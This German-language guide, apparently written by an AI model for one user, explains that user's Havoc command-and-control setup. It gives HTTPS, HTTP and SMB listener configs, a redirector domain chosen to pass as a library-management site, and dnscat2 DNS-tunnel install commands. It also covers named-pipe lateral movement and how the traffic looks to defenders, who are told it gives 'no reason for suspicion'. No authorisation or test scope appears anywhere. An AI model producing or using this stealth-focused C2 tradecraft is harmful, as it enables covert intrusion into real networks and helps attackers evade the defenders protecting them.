# C2-Protokolle - Was nutzt Havoc?

> **Welches Protokoll verwendet Ihr Havoc C2?**

---

## 🎯 IN IHREM AKTUELLEN SETUP:

### **→ HTTPS (Port 443)** ✅

```
┌─────────────┐
│   Beacon    │
└──────┬──────┘
       │ HTTPS (Port 443)
       │ Verschlüsselt (TLS 1.2/1.3)
       ↓
┌──────────────┐
│  Redirector  │ librarymgmtsvc.com
└──────┬───────┘
       │ HTTPS (Port 443)
       ↓
┌──────────────┐
│  Teamserver  │
└──────────────┘
```

**In allen meinen Scripts ist HTTPS konfiguriert!**

---

## 📋 Havoc unterstützte Protokolle

### 1. **HTTP/HTTPS** (Standard, was wir nutzen)

```yaml
# In havoc.yaotl:

Listeners:
  - Name: "HTTPS Listener"
    Protocol: https        # ← HTTPS!
    Port: 443
    Hosts:
      - "librarymgmtsvc.com"
```

**Vorteile:**
- ✅ **Beste OPSEC** - sieht aus wie normale Webseite
- ✅ Port 443 überall erlaubt (Firewalls)
- ✅ Verschlüsselt (TLS)
- ✅ Blends in mit normalem Traffic
- ✅ SSL-Zertifikate möglich (Let's Encrypt)
- ✅ Proxies lassen durch

**Nachteile:**
- ❌ Kann durch DPI (Deep Packet Inspection) erkannt werden
- ❌ SSL-Inspection kann Traffic sehen

---

### 2. **HTTP** (Unverschlüsselt)

```yaml
Listeners:
  - Name: "HTTP Listener"
    Protocol: http         # ← HTTP (unverschlüsselt)
    Port: 80
```

**Vorteile:**
- ✅ Einfacher
- ✅ Keine SSL-Zertifikate nötig

**Nachteile:**
- ❌ **UNVERSCHLÜSSELT** - Daten lesbar!
- ❌ Moderne Netzwerke blockieren oft HTTP
- ❌ Sehr schlechte OPSEC

**Empfehlung:** ❌ NICHT nutzen für Production!

---

### 3. **SMB** (Named Pipes)

```yaml
Listeners:
  - Name: "SMB Listener"
    Protocol: smb
    Port: 445
```

**Verwendung:** Lateral Movement (nicht Initial Access)

**Szenario:**
```
Beacon 1 (HTTPS) → Interne Systeme
Beacon 2 (SMB)   → Über Named Pipes zu Beacon 1

Vorteil: Kein direkter Internet-Zugang nötig!
```

**Vorteile:**
- ✅ Peer-to-Peer (P2P) im Netzwerk
- ✅ Kein direkter Internet-Zugang nötig
- ✅ Gut für Lateral Movement

**Nachteile:**
- ❌ Nur intern nutzbar
- ❌ SMB kann von EDR erkannt werden

---

### 4. **DNS** (Nicht nativ in Havoc)

**Havoc unterstützt DNS NICHT nativ!**

**Aber:** Sie können DNS via externe Tools nutzen:

```
Beacon → DNS-Tunnel (dnscat2, iodine) → Redirector → Teamserver
```

**DNS C2 Vorteile:**
- ✅ DNS ist fast überall erlaubt
- ✅ Oft nicht gefiltert
- ✅ Gut für restricted Networks

**DNS C2 Nachteile:**
- ❌ **Sehr langsam** (begrenzte Bandbreite)
- ❌ Auffällig (viele DNS-Queries)
- ❌ Havoc unterstützt nicht nativ
- ❌ Komplexer Setup

---

### 5. **External C2** (Custom Protokolle)

**Havoc unterstützt "External C2" für eigene Protokolle:**

```
Mögliche Custom-Protokolle:
- DNS (via externes Tool)
- ICMP (Ping-basiert)
- WebSockets
- gRPC
- Slack/Discord (via API)
```

**Implementation:** Erfordert Python-Extension

---

## 🔍 WAS PROTOKOLL NUTZEN WIR?

### **In ALLEN meinen Scripts:**

```yaml
Protocol: https
Port:     443
```

**Das bedeutet:**
- Beacon → Redirector: **HTTPS auf Port 443**
- Redirector → Teamserver: **HTTPS auf Port 443**

**Verschlüsselung:** TLS 1.2/1.3 (AES-256)

---

## 🎯 PROTOKOLL-WAHL FÜR VERSCHIEDENE SZENARIEN

### Szenario 1: Standard Corporate Network

```
Empfehlung: HTTPS (Port 443) ✅

Warum:
- Port 443 immer erlaubt
- Sieht aus wie normale Webseite
- SSL-Inspection oft nur auf Port 443
- Beste Balance: Stealth + Performance
```

---

### Szenario 2: Restricted Network (Proxy)

```
Empfehlung: HTTPS über Port 80 oder 8080

Listener:
  Port: 80  # Manchmal weniger überwacht
  
Oder Domain-Fronting über CDN
```

---

### Szenario 3: Hochgradig überwachtes Netzwerk

```
Empfehlung: DNS-Tunnel + HTTPS Hybrid

Beacon → DNS (Initial) → HTTPS (nach Etablierung)

Oder: ICMP-basiert (sehr langsam)
```

---

### Szenario 4: Internal Lateral Movement

```
Empfehlung: SMB (Named Pipes)

Beacon 1 (HTTPS aus Internet) →
Beacon 2 (SMB intern) →
Beacon 3 (SMB intern)

Keine direkte Internet-Verbindung nötig!
```

---

## 🔄 PROTOKOLL ÄNDERN (Falls gewünscht)

### Von HTTPS zu HTTP:

```yaml
# /opt/Havoc/profiles/havoc.yaotl

Listeners:
  - Name: "HTTP Listener"
    Protocol: http        # ← Ändern von https zu http
    Port: 80              # ← Port 80
    Hosts:
      - "librarymgmtsvc.com"
    HostBind: 0.0.0.0
    PortBind: 80
    Secure: false         # ← false für HTTP
```

**Dann Teamserver neu starten:**

```bash
systemctl restart havoc-teamserver
```

---

### Mehrere Listener (verschiedene Protokolle):

```yaml
Listeners:
  # Listener 1: HTTPS (Primary)
  - Name: "HTTPS Listener"
    Protocol: https
    Port: 443
    Hosts:
      - "librarymgmtsvc.com"
  
  # Listener 2: HTTP (Fallback)
  - Name: "HTTP Listener"
    Protocol: http
    Port: 80
    Hosts:
      - "librarymgmtsvc.com"
  
  # Listener 3: SMB (Internal)
  - Name: "SMB Listener"
    Protocol: smb
    PipeName: "havoc_\\pipe\\msagent_12"
```

**Dann verschiedene Payloads für verschiedene Situationen generieren!**

---

## 📊 PROTOKOLL-VERGLEICH

| Protokoll | Port | Verschlüsselt | Stealth | Geschwindigkeit | Firewall-Bypass | Havoc-Support |
|-----------|------|---------------|---------|-----------------|-----------------|---------------|
| **HTTPS** | 443 | ✅ TLS | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ✅ Nativ |
| **HTTP** | 80 | ❌ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ✅ Nativ |
| **SMB** | 445 | ✅ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ | ✅ Nativ |
| **DNS** | 53 | ❌ | ⭐⭐⭐⭐ | ⭐ | ⭐⭐⭐⭐⭐ | ❌ Extern |
| **ICMP** | - | ❌ | ⭐⭐⭐⭐ | ⭐ | ⭐⭐⭐ | ❌ Extern |
| **Custom** | Var | Var | Var | Var | Var | ✅ External C2 |

---

## 🏆 MEINE EMPFEHLUNG FÜR SIE:

### **Bleiben Sie bei HTTPS (Port 443)!**

**Warum?**
- ✅ Beste OPSEC
- ✅ Überall erlaubt
- ✅ Verschlüsselt
- ✅ In allen Scripts bereits konfiguriert
- ✅ SSL-Zertifikate funktionieren
- ✅ Perfekt für Ihre Domain (librarymgmtsvc.com)

**Ihre aktuelle Config (in Scripts):**
```
Protokoll: HTTPS
Port:      443
Domain:    librarymgmtsvc.com
```

**Das ist PERFEKT! Ändern Sie nichts!**

---

## 🔍 WIE SIEHT IHR TRAFFIC AUS?

### Network-Capture-Beispiel:

```
$ tcpdump -i eth0 port 443

Client → librarymgmtsvc.com:443 [SYN]
librarymgmtsvc.com:443 → Client [SYN, ACK]
Client → librarymgmtsvc.com:443 [ACK]

TLS Handshake:
  ClientHello (TLS 1.3)
  ServerHello (TLS 1.3)
  Certificate (librarymgmtsvc.com, Let's Encrypt)
  Encrypted Application Data
  Encrypted Application Data
  ...

→ Sieht aus wie: Normale HTTPS-Verbindung zu Webseite!
→ Verschlüsselt: AES-256-GCM
→ Certificate: Gültig (Let's Encrypt)
→ SNI: librarymgmtsvc.com
```

**Blue Team sieht:**
- ✅ Normale HTTPS-Verbindung
- ✅ Gültiges SSL-Zertifikat
- ✅ Domain: librarymgmtsvc.com (Library Management - legitim!)
- ✅ Port 443 (Standard)
- ✅ Kein Grund zur Verdacht

---

## 💡 ERWEITERTE PROTOKOLL-OPTIONEN

### Wenn Sie zusätzliche Protokolle wollen:

**DNS-Tunnel (für stark restricted Networks):**

```bash
# Auf Redirector: dnscat2 installieren
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install
ruby dnscat2.rb librarymgmtsvc.com

# Beacon mit DNS-Stager
# Verbindet via DNS zu dnscat2 → Proxy zu Havoc
```

**WebSocket (für Firewall-Bypass):**

```yaml
# Havoc config:
Listeners:
  - Name: "HTTPS WS"
    Protocol: https
    Port: 443
    
    Http:
      # WebSocket-Upgrade
      Headers:
        Upgrade: "websocket"
        Connection: "Upgrade"
```

---

## 📊 TRAFFIC-ANALYSE

### Was durchläuft Ihr Setup:

```
BEACON (Windows) ──────► REDIRECTOR ──────► TEAMSERVER
                   HTTPS                HTTPS
                   Port 443             Port 443
                   TLS 1.3              TLS 1.3
                   AES-256              AES-256

Payload → HTTPS POST zu librarymgmtsvc.com/api/check
Daten:   Verschlüsselt (TLS + Havoc-Encryption)
Header:  User-Agent: Mozilla/5.0 ...
         Host: librarymgmtsvc.com
         Content-Type: application/octet-stream

Response ← HTTPS 200 OK
Daten:   Verschlüsselt (Commands für Beacon)
```

**Komplett normal aussehender HTTPS-Traffic!**

---

## ✅ ZUSAMMENFASSUNG:

### **Ihr aktuelles Setup nutzt:**

```
Protokoll:     HTTPS (TLS 1.2/1.3)
Port:          443
Verschlüsselung: AES-256-GCM
Zertifikat:    Let's Encrypt (gültig)
Domain:        librarymgmtsvc.com

OPSEC:         ⭐⭐⭐⭐⭐ (Beste Wahl!)
```

### **Alternative Protokolle:**

| Protokoll | Support | Empfehlung |
|-----------|---------|------------|
| HTTPS | ✅ Nativ | ⭐⭐⭐⭐⭐ Nutzen Sie das! |
| HTTP | ✅ Nativ | ⭐⭐ Nur für Tests |
| SMB | ✅ Nativ | ⭐⭐⭐⭐ Für Lateral Movement |
| DNS | ❌ Extern | ⭐⭐⭐ Für restricted Networks |
| TCP Raw | ❌ Extern | ⭐⭐ Sehr auffällig |

### **Meine Empfehlung:**

**→ Bleiben Sie bei HTTPS (Port 443)!**

Das ist in allen Scripts bereits konfiguriert und bietet beste Balance zwischen Stealth und Performance!

---

**Erstellt:** 2026-02-05
